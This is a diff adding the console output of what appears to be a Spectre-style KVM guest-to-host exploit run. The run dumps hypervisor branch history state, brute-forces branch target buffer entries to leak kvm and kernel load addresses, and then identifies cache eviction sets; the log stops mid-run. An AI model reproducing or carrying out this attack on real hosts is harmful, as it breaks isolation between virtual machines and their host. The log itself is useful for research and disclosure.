@@ -1,0 +1,699 @@
+root@debian9attackervm:/home/user/Downloads/full_kvm_exploit# ./init_attack.sh 
+[13:35:43] === starting dump_hyper_bhb ===
+[13:35:43] cold min: 228
+[13:35:44] hot avg: 32969676/999989 = 32
+[13:35:44] hot_cold_limit: 162
+[13:35:44] false hot: 0, false cold: 6 (each in 1000000)
+[13:35:44] BHB state with 29 bits padding: 0x0000000000000000
+[13:35:44] BHB state with 28 bits padding: 0x0300000000000000
+[13:35:44] BHB state with 27 bits padding: 0x01c0000000000000
+[13:35:44] BHB state with 26 bits padding: 0x0170000000000000
+[13:35:45] BHB state with 25 bits padding: 0x035c000000000000
+[13:35:45] BHB state with 24 bits padding: 0x02d7000000000000
+[13:35:45] BHB state with 24 bits padding: 0x02d7000000000000
+[13:35:45] BHB state with 23 bits padding: 0x02b5c00000000000
+[13:35:45] BHB state with 22 bits padding: 0x03ad700000000000
+[13:35:45] BHB state with 21 bits padding: 0x02eb5c0000000000
+[13:35:45] BHB state with 20 bits padding: 0x00bad70000000000
+[13:35:45] BHB state with 19 bits padding: 0x022eb5c000000000
+[13:35:45] BHB state with 18 bits padding: 0x038bad7000000000
+[13:35:46] BHB state with 17 bits padding: 0x03e2eb5c00000000
+[13:35:46] BHB state with 16 bits padding: 0x01f8bad700000000
+[13:35:46] BHB state with 15 bits padding: 0x007e2eb5c0000000
+[13:35:46] BHB state with 14 bits padding: 0x021f8bad70000000
+[13:35:46] BHB state with 13 bits padding: 0x0287e2eb5c000000
+[13:35:46] BHB state with 12 bits padding: 0x03a1f8bad7000000
+[13:35:46] BHB state with 11 bits padding: 0x02e87e2eb5c00000
+[13:35:46] BHB state with 10 bits padding: 0x00ba1f8bad700000
+[13:35:46] BHB state with 09 bits padding: 0x032e87e2eb5c0000
+[13:35:46] BHB state with 08 bits padding: 0x00cba1f8bad70000
+[13:35:47] BHB state with 07 bits padding: 0x0332e87e2eb5c000
+[13:35:47] BHB state with 06 bits padding: 0x03ccba1f8bad7000
+[13:35:47] BHB state with 05 bits padding: 0x01f32e87e2eb5c00
+[13:35:47] BHB state with 04 bits padding: 0x037ccba1f8bad700
+[13:35:47] BHB state with 03 bits padding: 0x01df32e87e2eb5c0
+[13:35:47] BHB state with 02 bits padding: 0x0177ccba1f8bad70
+[13:35:47] BHB state with 01 bits padding: 0x015df32e87e2eb5c
+[13:35:47] BHB state with 00 bits padding: 0x00577ccba1f8bad7
+[13:35:47] kvm_intel.ko base mod 0x100000 is 0xc5000
+[13:35:47] === starting hyper_btb_brute ===
+[13:35:48] cold min: 244
+[13:35:48] hot avg: 32984428/999990 = 32
+[13:35:48] hot_cold_limit: 173
+[13:35:48] false hot: 0, false cold: 11 (each in 1000000)
+[13:35:48] kvm_intel_load_address = 0xc5000
+[13:35:51] got 1000/1000 hits for kvm->kvm_intel in 186 iterations
+[13:35:51] result dump (WITH WONKY ALIASING, NOT REAL ADDRESSES):
+[13:35:51]   0xffffffffc0262000 981
+[13:35:51] indirect call source for kvm->kvm_intel is at 0xffffffffc0281390 or alias
+[13:35:56] got 1000/1000 hits for vmlinux->kvm in 161 iterations
+[13:35:56] result dump:
+[13:35:56]   0xffffffffbc000000 988
+[13:35:56] vmlinux is at 0xffffffffbc000000
+[13:35:56] testing for alias bit 1
+[13:35:56] votes for alias bit 1: 0 vs 1000; bit=1
+[13:35:56] testing for alias bit 2
+[13:35:56] votes for alias bit 2: 1000 vs 0; bit=0
+[13:35:56] testing for alias bit 3
+[13:35:56] votes for alias bit 3: 1000 vs 0; bit=0
+[13:35:56] testing for alias bit 4
+[13:35:56] votes for alias bit 4: 1000 vs 0; bit=0
+[13:35:56] alias index is 1
+[13:35:56] kvm load address is 0xffffffffc0664000
+[13:35:56] === starting cacheset_identify ===
+[13:35:56] cold min: 240
+[13:35:56] hot avg: 32992324/999989 = 32
+[13:35:56] hot_cold_limit: 170
+[13:35:57] false hot: 0, false cold: 9 (each in 1000000)
+[13:35:57] attempt_lines=2138
+[13:35:57] testing for unmapped lines in set: 99%
+[13:35:57] found set: id=1, size=143 (107% of expected) after 3 loops
+[13:35:57] attempt_lines=2128
+[13:35:58] testing for unmapped lines in set: 99%
+[13:35:58] found set: id=2, size=122 (91% of expected) after 1 loops
+[13:35:58] attempt_lines=2118
+[13:35:59] testing for unmapped lines in set: 99%
+[13:35:59] found set: id=3, size=142 (106% of expected) after 1 loops
+[13:35:59] attempt_lines=2108
+[13:36:00] testing for unmapped lines in set: 99%
+[13:36:00] found set: id=4, size=126 (94% of expected) after 1 loops
+[13:36:00] attempt_lines=2098
+[13:36:01] testing for unmapped lines in set: 99%
+[13:36:01] found set: id=5, size=153 (114% of expected) after 1 loops
+[13:36:01] attempt_lines=2088
+[13:36:02] testing for unmapped lines in set: 99%
+[13:36:02] found set: id=6, size=128 (96% of expected) after 9 loops
+[13:36:02] attempt_lines=2078
+[13:36:03] testing for unmapped lines in set: 99%
+[13:36:03] found set: id=7, size=137 (102% of expected) after 2 loops
+[13:36:03] attempt_lines=2068
+[13:36:05] testing for unmapped lines in set: 99%
+[13:36:05] found set: id=8, size=161 (120% of expected) after 8 loops
+[13:36:05] attempt_lines=2057
+[13:36:06] testing for unmapped lines in set: 99%
+[13:36:06] found set: id=9, size=152 (114% of expected) after 1 loops
+[13:36:06] attempt_lines=2047
+[13:36:07] testing for unmapped lines in set: 99%
+[13:36:07] found set: id=10, size=159 (119% of expected) after 1 loops
+[13:36:07] attempt_lines=2037
+[13:36:08] testing for unmapped lines in set: 99%
+[13:36:08] found set: id=11, size=144 (108% of expected) after 7 loops
+[13:36:08] attempt_lines=2027
+[13:36:09] testing for unmapped lines in set: 99%
+[13:36:09] found set: id=12, size=155 (116% of expected) after 2 loops
+[13:36:09] attempt_lines=2017
+[13:36:10] testing for unmapped lines in set: 99%
+[13:36:10] found set: id=13, size=152 (114% of expected) after 4 loops
+[13:36:10] attempt_lines=2007
+[13:36:11] testing for unmapped lines in set: 99%
+[13:36:11] found set: id=14, size=160 (120% of expected) after 1 loops
+[13:36:11] attempt_lines=1997
+[13:36:12] testing for unmapped lines in set: 99%
+[13:36:12] found set: id=15, size=133 (99% of expected) after 4 loops
+[13:36:12] attempt_lines=1987
+[13:36:13] testing for unmapped lines in set: 99%
+[13:36:13] found set: id=16, size=140 (105% of expected) after 2 loops
+[13:36:13] attempt_lines=1976
+[13:36:14] testing for unmapped lines in set: 99%
+[13:36:14] found set: id=17, size=153 (114% of expected) after 4 loops
+[13:36:14] attempt_lines=1966
+[13:36:15] testing for unmapped lines in set: 99%
+[13:36:15] found set: id=18, size=135 (101% of expected) after 2 loops
+[13:36:15] attempt_lines=1956
+[13:36:16] testing for unmapped lines in set: 99%
+[13:36:16] found set: id=19, size=143 (107% of expected) after 8 loops
+[13:36:16] attempt_lines=1946
+[13:36:17] testing for unmapped lines in set: 99%
+[13:36:17] found set: id=20, size=115 (86% of expected) after 2 loops
+[13:36:17] attempt_lines=1936
+[13:36:18] testing for unmapped lines in set: 99%
+[13:36:18] found set: id=21, size=154 (115% of expected) after 3 loops
+[13:36:18] attempt_lines=1926
+[13:36:21] testing for unmapped lines in set: 99%
+[13:36:21] found set: id=22, size=156 (117% of expected) after 22 loops
+[13:36:21] attempt_lines=1915
+[13:36:21] testing for unmapped lines in set: 99%
+[13:36:21] found set: id=23, size=141 (105% of expected) after 1 loops
+[13:36:21] attempt_lines=1905
+[13:36:22] testing for unmapped lines in set: 99%
+[13:36:22] found set: id=24, size=133 (99% of expected) after 1 loops
+[13:36:22] attempt_lines=1895
+[13:36:23] testing for unmapped lines in set: 99%
+[13:36:23] found set: id=25, size=127 (95% of expected) after 1 loops
+[13:36:23] attempt_lines=1885
+[13:36:24] testing for unmapped lines in set: 99%
+[13:36:24] found set: id=26, size=151 (113% of expected) after 4 loops
+[13:36:24] attempt_lines=1875
+[13:36:25] testing for unmapped lines in set: 99%
+[13:36:25] found set: id=27, size=138 (103% of expected) after 3 loops
+[13:36:25] attempt_lines=1864
+[13:36:27] testing for unmapped lines in set: 99%
+[13:36:27] found set: id=28, size=142 (106% of expected) after 6 loops
+[13:36:27] attempt_lines=1854
+[13:36:30] testing for unmapped lines in set: 99%
+[13:36:30] found set: id=29, size=152 (114% of expected) after 41 loops
+[13:36:30] attempt_lines=1844
+[13:36:31] testing for unmapped lines in set: 99%
+[13:36:31] found set: id=30, size=145 (108% of expected) after 1 loops
+[13:36:31] attempt_lines=1834
+[13:36:32] testing for unmapped lines in set: 99%
+[13:36:32] found set: id=31, size=138 (103% of expected) after 11 loops
+[13:36:32] attempt_lines=1823
+[13:36:33] testing for unmapped lines in set: 99%
+[13:36:33] found set: id=32, size=146 (109% of expected) after 1 loops
+[13:36:33] attempt_lines=1813
+[13:36:34] testing for unmapped lines in set: 99%
+[13:36:34] found set: id=33, size=143 (107% of expected) after 2 loops
+[13:36:34] attempt_lines=1803
+[13:36:35] testing for unmapped lines in set: 99%
+[13:36:35] found set: id=34, size=136 (102% of expected) after 2 loops
+[13:36:35] attempt_lines=1793
+[13:36:36] testing for unmapped lines in set: 99%
+[13:36:36] found set: id=35, size=154 (115% of expected) after 6 loops
+[13:36:36] attempt_lines=1782
+[13:36:37] testing for unmapped lines in set: 99%
+[13:36:37] found set: id=36, size=113 (84% of expected) after 4 loops
+[13:36:37] attempt_lines=1772
+[13:36:38] testing for unmapped lines in set: 99%
+[13:36:38] found set: id=37, size=143 (107% of expected) after 5 loops
+[13:36:38] attempt_lines=1762
+[13:36:38] testing for unmapped lines in set: 99%
+[13:36:38] found set: id=38, size=127 (95% of expected) after 1 loops
+[13:36:38] attempt_lines=1752
+[13:36:39] testing for unmapped lines in set: 99%
+[13:36:39] found set: id=39, size=127 (95% of expected) after 1 loops
+[13:36:39] attempt_lines=1741
+[13:36:40] testing for unmapped lines in set: 99%
+[13:36:40] found set: id=40, size=124 (93% of expected) after 1 loops
+[13:36:40] attempt_lines=1731
+[13:36:40] testing for unmapped lines in set: 99%
+[13:36:40] found set: id=41, size=136 (102% of expected) after 1 loops
+[13:36:40] attempt_lines=1721
+[13:36:41] testing for unmapped lines in set: 99%
+[13:36:41] found set: id=42, size=130 (97% of expected) after 2 loops
+[13:36:41] attempt_lines=1711
+[13:36:42] testing for unmapped lines in set: 99%
+[13:36:42] found set: id=43, size=122 (91% of expected) after 1 loops
+[13:36:42] attempt_lines=1700
+[13:36:43] testing for unmapped lines in set: 99%
+[13:36:43] found set: id=44, size=148 (111% of expected) after 4 loops
+[13:36:43] attempt_lines=1690
+[13:36:44] testing for unmapped lines in set: 99%
+[13:36:44] found set: id=45, size=143 (107% of expected) after 1 loops
+[13:36:44] attempt_lines=1680
+[13:36:45] testing for unmapped lines in set: 99%
+[13:36:45] found set: id=46, size=134 (100% of expected) after 5 loops
+[13:36:45] attempt_lines=1669
+[13:36:46] testing for unmapped lines in set: 99%
+[13:36:46] found set: id=47, size=129 (96% of expected) after 1 loops
+[13:36:46] attempt_lines=1659
+[13:36:46] testing for unmapped lines in set: 99%
+[13:36:46] found set: id=48, size=147 (110% of expected) after 1 loops
+[13:36:46] attempt_lines=1649
+[13:36:47] testing for unmapped lines in set: 99%
+[13:36:47] found set: id=49, size=131 (98% of expected) after 1 loops
+[13:36:47] attempt_lines=1638
+[13:36:47] testing for unmapped lines in set: 99%
+[13:36:47] found set: id=50, size=128 (96% of expected) after 1 loops
+[13:36:47] attempt_lines=1628
+[13:36:48] testing for unmapped lines in set: 99%
+[13:36:48] found set: id=51, size=148 (111% of expected) after 4 loops
+[13:36:48] attempt_lines=1618
+[13:36:49] testing for unmapped lines in set: 99%
+[13:36:49] found set: id=52, size=124 (93% of expected) after 1 loops
+[13:36:49] attempt_lines=1607
+[13:36:50] testing for unmapped lines in set: 99%
+[13:36:50] found set: id=53, size=134 (100% of expected) after 8 loops
+[13:36:50] attempt_lines=1597
+[13:36:51] testing for unmapped lines in set: 99%
+[13:36:51] found set: id=54, size=148 (111% of expected) after 2 loops
+[13:36:51] attempt_lines=1587
+[13:36:51] testing for unmapped lines in set: 99%
+[13:36:51] found set: id=55, size=135 (101% of expected) after 2 loops
+[13:36:51] attempt_lines=1576
+[13:36:52] testing for unmapped lines in set: 99%
+[13:36:52] found set: id=56, size=133 (99% of expected) after 2 loops
+[13:36:52] attempt_lines=1566
+[13:36:53] testing for unmapped lines in set: 99%
+[13:36:53] found set: id=57, size=141 (105% of expected) after 1 loops
+[13:36:53] attempt_lines=1555
+[13:36:54] testing for unmapped lines in set: 99%
+[13:36:54] found set: id=58, size=143 (107% of expected) after 7 loops
+[13:36:54] attempt_lines=1545
+[13:36:55] testing for unmapped lines in set: 99%
+[13:36:55] found set: id=59, size=145 (108% of expected) after 1 loops
+[13:36:55] attempt_lines=1535
+[13:36:57] testing for unmapped lines in set: 99%
+[13:36:57] found set: id=60, size=123 (92% of expected) after 33 loops
+[13:36:57] attempt_lines=1524
+[13:36:58] testing for unmapped lines in set: 99%
+[13:36:58] found set: id=61, size=137 (102% of expected) after 1 loops
+[13:36:58] attempt_lines=1514
+[13:36:59] testing for unmapped lines in set: 99%
+[13:36:59] found set: id=62, size=131 (98% of expected) after 14 loops
+[13:36:59] attempt_lines=1503
+[13:37:00] testing for unmapped lines in set: 99%
+[13:37:00] found set: id=63, size=142 (106% of expected) after 2 loops
+[13:37:00] attempt_lines=1493
+[13:37:01] testing for unmapped lines in set: 99%
+[13:37:01] found set: id=64, size=131 (98% of expected) after 3 loops
+[13:37:01] attempt_lines=1482
+[13:37:01] testing for unmapped lines in set: 99%
+[13:37:01] found set: id=65, size=130 (97% of expected) after 1 loops
+[13:37:01] attempt_lines=1472
+[13:37:02] testing for unmapped lines in set: 99%
+[13:37:02] found set: id=66, size=137 (102% of expected) after 15 loops
+[13:37:02] attempt_lines=1462
+[13:37:03] testing for unmapped lines in set: 99%
+[13:37:03] found set: id=67, size=131 (98% of expected) after 2 loops
+[13:37:03] attempt_lines=1451
+[13:37:04] testing for unmapped lines in set: 99%
+[13:37:04] found set: id=68, size=136 (102% of expected) after 3 loops
+[13:37:04] attempt_lines=1441
+[13:37:05] testing for unmapped lines in set: 99%
+[13:37:05] found set: id=69, size=130 (97% of expected) after 3 loops
+[13:37:05] attempt_lines=1430
+[13:37:06] testing for unmapped lines in set: 99%
+[13:37:06] found set: id=70, size=123 (92% of expected) after 2 loops
+[13:37:06] attempt_lines=1420
+[13:37:06] testing for unmapped lines in set: 99%
+[13:37:06] found set: id=71, size=135 (101% of expected) after 1 loops
+[13:37:06] attempt_lines=1409
+[13:37:07] testing for unmapped lines in set: 99%
+[13:37:07] found set: id=72, size=125 (93% of expected) after 1 loops
+[13:37:07] attempt_lines=1399
+[13:37:08] testing for unmapped lines in set: 99%
+[13:37:08] found set: id=73, size=136 (102% of expected) after 5 loops
+[13:37:08] attempt_lines=1388
+[13:37:08] testing for unmapped lines in set: 99%
+[13:37:08] found set: id=74, size=139 (104% of expected) after 1 loops
+[13:37:08] attempt_lines=1378
+[13:37:08] testing for unmapped lines in set: 99%
+[13:37:08] found set: id=75, size=128 (96% of expected) after 1 loops
+[13:37:08] attempt_lines=1367
+[13:37:09] testing for unmapped lines in set: 99%
+[13:37:09] found set: id=76, size=138 (103% of expected) after 3 loops
+[13:37:09] attempt_lines=1357
+[13:37:09] testing for unmapped lines in set: 99%
+[13:37:09] found set: id=77, size=136 (102% of expected) after 1 loops
+[13:37:09] attempt_lines=1346
+[13:37:10] testing for unmapped lines in set: 99%
+[13:37:10] found set: id=78, size=140 (105% of expected) after 2 loops
+[13:37:10] attempt_lines=1336
+[13:37:10] testing for unmapped lines in set: 99%
+[13:37:10] found set: id=79, size=138 (103% of expected) after 1 loops
+[13:37:10] attempt_lines=1325
+[13:37:11] testing for unmapped lines in set: 99%
+[13:37:11] found set: id=80, size=144 (108% of expected) after 5 loops
+[13:37:11] attempt_lines=1314
+[13:37:12] testing for unmapped lines in set: 99%
+[13:37:12] found set: id=81, size=150 (112% of expected) after 1 loops
+[13:37:12] attempt_lines=1304
+[13:37:12] testing for unmapped lines in set: 99%
+[13:37:12] found set: id=82, size=125 (93% of expected) after 1 loops
+[13:37:12] attempt_lines=1293
+[13:37:13] testing for unmapped lines in set: 99%
+[13:37:13] found set: id=83, size=125 (93% of expected) after 2 loops
+[13:37:13] attempt_lines=1283
+[13:37:14] testing for unmapped lines in set: 99%
+[13:37:14] found set: id=84, size=138 (103% of expected) after 3 loops
+[13:37:14] attempt_lines=1272
+[13:37:14] testing for unmapped lines in set: 99%
+[13:37:14] found set: id=85, size=125 (93% of expected) after 1 loops
+[13:37:14] attempt_lines=1262
+[13:37:15] testing for unmapped lines in set: 99%
+[13:37:15] found set: id=86, size=139 (104% of expected) after 1 loops
+[13:37:15] attempt_lines=1251
+[13:37:16] testing for unmapped lines in set: 99%
+[13:37:16] found set: id=87, size=126 (94% of expected) after 3 loops
+[13:37:16] attempt_lines=1240
+[13:37:16] testing for unmapped lines in set: 99%
+[13:37:16] found set: id=88, size=139 (104% of expected) after 1 loops
+[13:37:16] attempt_lines=1230
+[13:37:17] testing for unmapped lines in set: 99%
+[13:37:17] found set: id=89, size=129 (96% of expected) after 2 loops
+[13:37:17] attempt_lines=1219
+[13:37:18] testing for unmapped lines in set: 99%
+[13:37:18] found set: id=90, size=154 (115% of expected) after 1 loops
+[13:37:18] attempt_lines=1208
+[13:37:18] testing for unmapped lines in set: 99%
+[13:37:18] found set: id=91, size=136 (102% of expected) after 3 loops
+[13:37:18] attempt_lines=1198
+[13:37:19] testing for unmapped lines in set: 99%
+[13:37:19] found set: id=92, size=140 (105% of expected) after 2 loops
+[13:37:19] attempt_lines=1187
+[13:37:20] testing for unmapped lines in set: 99%
+[13:37:20] found set: id=93, size=132 (99% of expected) after 2 loops
+[13:37:20] attempt_lines=1176
+[13:37:20] testing for unmapped lines in set: 99%
+[13:37:20] found set: id=94, size=142 (106% of expected) after 2 loops
+[13:37:20] attempt_lines=1166
+[13:37:21] testing for unmapped lines in set: 99%
+[13:37:21] found set: id=95, size=146 (109% of expected) after 5 loops
+[13:37:21] attempt_lines=1155
+[13:37:22] testing for unmapped lines in set: 99%
+[13:37:22] found set: id=96, size=125 (93% of expected) after 7 loops
+[13:37:22] attempt_lines=1144
+[13:37:23] testing for unmapped lines in set: 99%
+[13:37:23] found set: id=97, size=144 (108% of expected) after 1 loops
+[13:37:23] attempt_lines=1134
+[13:37:23] testing for unmapped lines in set: 99%
+[13:37:23] found set: id=98, size=132 (99% of expected) after 2 loops
+[13:37:23] attempt_lines=1123
+[13:37:24] testing for unmapped lines in set: 99%
+[13:37:24] found set: id=99, size=137 (102% of expected) after 1 loops
+[13:37:24] attempt_lines=1112
+[13:37:24] testing for unmapped lines in set: 99%
+[13:37:24] found set: id=100, size=130 (97% of expected) after 1 loops
+[13:37:24] attempt_lines=1101
+[13:37:25] testing for unmapped lines in set: 99%
+[13:37:25] found set: id=101, size=139 (104% of expected) after 1 loops
+[13:37:25] attempt_lines=1091
+[13:37:25] testing for unmapped lines in set: 99%
+[13:37:25] found set: id=102, size=135 (101% of expected) after 1 loops
+[13:37:25] attempt_lines=1080
+[13:37:26] testing for unmapped lines in set: 99%
+[13:37:26] found set: id=103, size=132 (99% of expected) after 1 loops
+[13:37:26] attempt_lines=1069
+[13:37:26] testing for unmapped lines in set: 99%
+[13:37:26] found set: id=104, size=128 (96% of expected) after 4 loops
+[13:37:26] attempt_lines=1058
+[13:37:27] testing for unmapped lines in set: 99%
+[13:37:27] found set: id=105, size=134 (100% of expected) after 12 loops
+[13:37:27] attempt_lines=1048
+[13:37:28] testing for unmapped lines in set: 99%
+[13:37:28] found set: id=106, size=142 (106% of expected) after 2 loops
+[13:37:28] attempt_lines=1037
+[13:37:29] testing for unmapped lines in set: 99%
+[13:37:29] found set: id=107, size=144 (108% of expected) after 16 loops
+[13:37:29] attempt_lines=1026
+[13:37:30] testing for unmapped lines in set: 99%
+[13:37:30] found set: id=108, size=132 (99% of expected) after 3 loops
+[13:37:30] attempt_lines=1015
+[13:37:31] testing for unmapped lines in set: 99%
+[13:37:31] found set: id=109, size=117 (87% of expected) after 24 loops
+[13:37:31] attempt_lines=1004
+[13:37:31] testing for unmapped lines in set: 99%
+[13:37:31] found set: id=110, size=146 (109% of expected) after 2 loops
+[13:37:31] attempt_lines=993
+[13:37:32] testing for unmapped lines in set: 99%
+[13:37:32] found set: id=111, size=132 (99% of expected) after 4 loops
+[13:37:32] attempt_lines=983
+[13:37:33] testing for unmapped lines in set: 99%
+[13:37:33] found set: id=112, size=149 (111% of expected) after 4 loops
+[13:37:33] attempt_lines=972
+[13:37:33] testing for unmapped lines in set: 99%
+[13:37:33] found set: id=113, size=127 (95% of expected) after 4 loops
+[13:37:33] attempt_lines=961
+[13:37:35] testing for unmapped lines in set: 99%
+[13:37:35] found set: id=114, size=141 (105% of expected) after 40 loops
+[13:37:35] attempt_lines=950
+[13:37:36] testing for unmapped lines in set: 99%
+[13:37:36] found set: id=115, size=121 (90% of expected) after 38 loops
+[13:37:36] attempt_lines=939
+[13:37:37] testing for unmapped lines in set: 99%
+[13:37:37] found set: id=116, size=140 (105% of expected) after 1 loops
+[13:37:37] attempt_lines=928
+[13:37:38] testing for unmapped lines in set: 99%
+[13:37:38] found set: id=117, size=133 (99% of expected) after 21 loops
+[13:37:38] attempt_lines=917
+[13:37:39] testing for unmapped lines in set: 99%
+[13:37:39] found set: id=118, size=118 (88% of expected) after 2 loops
+[13:37:39] attempt_lines=906
+[13:37:39] testing for unmapped lines in set: 99%
+[13:37:39] found set: id=119, size=136 (102% of expected) after 1 loops
+[13:37:39] attempt_lines=895
+[13:37:40] testing for unmapped lines in set: 99%
+[13:37:40] found set: id=120, size=130 (97% of expected) after 2 loops
+[13:37:40] attempt_lines=884
+[13:37:40] testing for unmapped lines in set: 99%
+[13:37:40] found set: id=121, size=142 (106% of expected) after 7 loops
+[13:37:40] attempt_lines=873
+[13:37:41] testing for unmapped lines in set: 99%
+[13:37:41] found set: id=122, size=127 (95% of expected) after 1 loops
+[13:37:41] attempt_lines=862
+[13:37:41] testing for unmapped lines in set: 99%
+[13:37:41] found set: id=123, size=136 (102% of expected) after 3 loops
+[13:37:41] attempt_lines=851
+[13:37:42] testing for unmapped lines in set: 99%
+[13:37:42] found set: id=124, size=136 (102% of expected) after 3 loops
+[13:37:42] attempt_lines=840
+[13:37:42] testing for unmapped lines in set: 99%
+[13:37:42] found set: id=125, size=127 (95% of expected) after 5 loops
+[13:37:42] attempt_lines=829
+[13:37:43] testing for unmapped lines in set: 99%
+[13:37:43] found set: id=126, size=141 (105% of expected) after 1 loops
+[13:37:43] attempt_lines=818
+[13:37:43] testing for unmapped lines in set: 99%
+[13:37:43] found set: id=127, size=128 (96% of expected) after 1 loops
+[13:37:43] attempt_lines=807
+[13:37:43] testing for unmapped lines in set: 99%
+[13:37:43] found set: id=128, size=130 (97% of expected) after 1 loops
+[13:37:43] attempt_lines=796
+[13:37:44] testing for unmapped lines in set: 99%
+[13:37:44] found set: id=129, size=137 (102% of expected) after 1 loops
+[13:37:44] attempt_lines=785
+[13:37:44] testing for unmapped lines in set: 99%
+[13:37:44] found set: id=130, size=136 (102% of expected) after 2 loops
+[13:37:44] attempt_lines=774
+[13:37:44] testing for unmapped lines in set: 99%
+[13:37:44] found set: id=131, size=119 (89% of expected) after 1 loops
+[13:37:44] attempt_lines=763
+[13:37:45] testing for unmapped lines in set: 99%
+[13:37:45] found set: id=132, size=125 (93% of expected) after 1 loops
+[13:37:45] attempt_lines=751
+[13:37:45] testing for unmapped lines in set: 99%
+[13:37:45] found set: id=133, size=116 (87% of expected) after 4 loops
+[13:37:45] attempt_lines=740
+[13:37:45] testing for unmapped lines in set: 99%
+[13:37:45] found set: id=134, size=137 (102% of expected) after 1 loops
+[13:37:45] attempt_lines=729
+[13:37:45] testing for unmapped lines in set: 99%
+[13:37:45] found set: id=135, size=135 (101% of expected) after 1 loops
+[13:37:45] attempt_lines=718
+[13:37:46] testing for unmapped lines in set: 99%
+[13:37:46] found set: id=136, size=126 (94% of expected) after 1 loops
+[13:37:46] attempt_lines=707
+[13:37:46] testing for unmapped lines in set: 99%
+[13:37:46] found set: id=137, size=129 (96% of expected) after 2 loops
+[13:37:46] attempt_lines=695
+[13:37:47] testing for unmapped lines in set: 99%
+[13:37:47] found set: id=138, size=123 (92% of expected) after 1 loops
+[13:37:47] attempt_lines=684
+[13:37:47] testing for unmapped lines in set: 99%
+[13:37:47] found set: id=139, size=135 (101% of expected) after 1 loops
+[13:37:47] attempt_lines=673
+[13:37:47] testing for unmapped lines in set: 99%
+[13:37:47] found set: id=140, size=135 (101% of expected) after 1 loops
+[13:37:47] attempt_lines=661
+[13:37:47] testing for unmapped lines in set: 99%
+[13:37:47] found set: id=141, size=132 (99% of expected) after 2 loops
+[13:37:47] attempt_lines=650
+[13:37:48] testing for unmapped lines in set: 99%
+[13:37:48] found set: id=142, size=134 (100% of expected) after 8 loops
+[13:37:48] attempt_lines=639
+[13:37:48] testing for unmapped lines in set: 99%
+[13:37:48] found set: id=143, size=138 (103% of expected) after 2 loops
+[13:37:48] attempt_lines=627
+[13:37:48] testing for unmapped lines in set: 99%
+[13:37:48] found set: id=144, size=129 (96% of expected) after 4 loops
+[13:37:48] attempt_lines=616
+[13:37:49] testing for unmapped lines in set: 99%
+[13:37:49] found set: id=145, size=125 (93% of expected) after 2 loops
+[13:37:49] attempt_lines=605
+[13:37:49] testing for unmapped lines in set: 99%
+[13:37:49] found set: id=146, size=130 (97% of expected) after 12 loops
+[13:37:49] attempt_lines=593
+[13:37:50] testing for unmapped lines in set: 99%
+[13:37:50] found set: id=147, size=124 (93% of expected) after 34 loops
+[13:37:50] attempt_lines=582
+[13:37:50] testing for unmapped lines in set: 99%
+[13:37:50] found set: id=148, size=122 (91% of expected) after 7 loops
+[13:37:50] attempt_lines=570
+[13:37:51] testing for unmapped lines in set: 99%
+[13:37:51] found set: id=149, size=131 (98% of expected) after 36 loops
+[13:37:51] attempt_lines=559
+[13:37:52] testing for unmapped lines in set: 99%
+[13:37:52] found set: id=150, size=132 (99% of expected) after 33 loops
+[13:37:52] attempt_lines=547
+[13:37:53] testing for unmapped lines in set: 99%
+[13:37:53] found set: id=151, size=131 (98% of expected) after 25 loops
+[13:37:53] attempt_lines=536
+[13:37:53] testing for unmapped lines in set: 99%
+[13:37:53] found set: id=152, size=117 (87% of expected) after 4 loops
+[13:37:53] attempt_lines=524
+[13:37:53] testing for unmapped lines in set: 99%
+[13:37:53] found set: id=153, size=121 (90% of expected) after 4 loops
+[13:37:53] attempt_lines=512
+[13:37:54] testing for unmapped lines in set: 99%
+[13:37:54] found set: id=154, size=133 (99% of expected) after 5 loops
+[13:37:54] attempt_lines=501
+[13:37:54] testing for unmapped lines in set: 99%
+[13:37:54] found set: id=155, size=131 (98% of expected) after 1 loops
+[13:37:54] attempt_lines=489
+[13:37:54] testing for unmapped lines in set: 99%
+[13:37:54] found set: id=156, size=118 (88% of expected) after 2 loops
+[13:37:54] attempt_lines=477
+[13:37:54] testing for unmapped lines in set: 99%
+[13:37:54] found set: id=157, size=134 (100% of expected) after 1 loops
+[13:37:54] attempt_lines=466
+[13:37:55] testing for unmapped lines in set: 99%
+[13:37:55] found set: id=158, size=123 (92% of expected) after 1 loops
+[13:37:55] attempt_lines=454
+[13:37:55] testing for unmapped lines in set: 99%
+[13:37:55] found set: id=159, size=129 (96% of expected) after 7 loops
+[13:37:55] attempt_lines=442
+[13:37:55] testing for unmapped lines in set: 99%
+[13:37:55] found set: id=160, size=131 (98% of expected) after 2 loops
+[13:37:55] attempt_lines=430
+[13:37:56] testing for unmapped lines in set: 99%
+[13:37:56] found set: id=161, size=126 (94% of expected) after 1 loops
+[13:37:56] attempt_lines=418
+[13:37:56] testing for unmapped lines in set: 99%
+[13:37:56] found set: id=162, size=124 (93% of expected) after 5 loops
+[13:37:56] attempt_lines=406
+[13:37:56] testing for unmapped lines in set: 99%
+[13:37:56] found set: id=163, size=133 (99% of expected) after 3 loops
+[13:37:56] attempt_lines=395
+[13:37:57] testing for unmapped lines in set: 99%
+[13:37:57] found set: id=164, size=122 (91% of expected) after 1 loops
+[13:37:57] attempt_lines=383
+[13:37:57] testing for unmapped lines in set: 99%
+[13:37:57] found set: id=165, size=131 (98% of expected) after 2 loops
+[13:37:57] attempt_lines=371
+[13:37:57] testing for unmapped lines in set: 99%
+[13:37:57] found set: id=166, size=122 (91% of expected) after 1 loops
+[13:37:57] attempt_lines=358
+[13:37:57] testing for unmapped lines in set: 99%
+[13:37:57] found set: id=167, size=131 (98% of expected) after 1 loops
+[13:37:57] attempt_lines=346
+[13:37:57] testing for unmapped lines in set: 99%
+[13:37:57] found set: id=168, size=127 (95% of expected) after 1 loops
+[13:37:57] attempt_lines=334
+[13:37:58] testing for unmapped lines in set: 99%
+[13:37:58] found set: id=169, size=125 (93% of expected) after 3 loops
+[13:37:58] attempt_lines=322
+[13:37:58] testing for unmapped lines in set: 99%
+[13:37:58] found set: id=170, size=132 (99% of expected) after 3 loops
+[13:37:58] attempt_lines=310
+[13:37:58] testing for unmapped lines in set: 99%
+[13:37:58] found set: id=171, size=129 (96% of expected) after 1 loops
+[13:37:58] attempt_lines=297
+[13:37:58] testing for unmapped lines in set: 99%
+[13:37:58] found set: id=172, size=139 (104% of expected) after 1 loops
+[13:37:58] attempt_lines=285
+[13:37:59] testing for unmapped lines in set: 99%
+[13:37:59] found set: id=173, size=121 (90% of expected) after 2 loops
+[13:37:59] attempt_lines=273
+[13:37:59] testing for unmapped lines in set: 99%
+[13:37:59] found set: id=174, size=133 (99% of expected) after 1 loops
+[13:37:59] attempt_lines=260
